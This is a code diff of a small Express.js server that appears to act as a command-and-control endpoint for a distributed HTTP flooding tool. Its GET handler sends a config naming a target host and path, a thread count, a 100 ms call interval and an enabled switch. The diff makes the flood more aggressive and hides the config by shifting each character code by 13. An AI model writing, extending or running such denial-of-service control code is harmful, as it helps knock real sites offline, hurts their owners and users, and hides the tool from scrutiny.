@@ -4,22 +4,36 @@ const port = 3000;
 
 app.get('/', (_, res) => {
   const newLine = '\r\n';
-  const separator = newLine.repeat(2);
   const host = 'beatmasta.studio';
-  const port = 80;
+  const port = 443;
   const path = '/test.php';
   const method = 'POST';
   const contentLength = 1024;
-  const threadCount = 2;
-  const callIntervalInMs = 500;
-  const configFetchIntervalInMs = 5000;
-  const state = 'START';
-  const headers = `${method} ${path} HTTP/1.1${newLine}Host: ${host}${newLine}Accept: */*${newLine}Content-length: ${contentLength}${separator}${host}:${port}${separator}${contentLength}${separator}${threadCount}${separator}${callIntervalInMs}${separator}${configFetchIntervalInMs}${separator}${state}`;
+  const threadCount = 10;
+  const callIntervalInMs = 100;
+  const configFetchIntervalInMs = 100000;
+  const enabled = true;
+  const ssl = true;
 
-  res.set('Content-Type', 'text/plain');
+  let body = `
+headers=${method} ${path} HTTP/1.1${newLine}Host: ${host}${newLine}Accept: */*${newLine}Content-length: ${contentLength};
+host=${host};
+port=${port};
+content_length=${contentLength};
+thread_count=${threadCount};
+call_interval_in_ms=${callIntervalInMs};
+config_fetch_interval_in_ms=${configFetchIntervalInMs};
+enabled=${enabled};
+ssl=${ssl}${newLine}
+  `;
+
+  console.log(body);
+
+  body = body.split("").map((_, i) => String.fromCharCode(body.charCodeAt(i) + 13)).join("");
 
   console.log('Sending config...');
-  res.send(headers);
+  res.set('Content-Type', 'text/plain');
+  res.send(body);
 });
 
 app.post('/', (req, res) => {
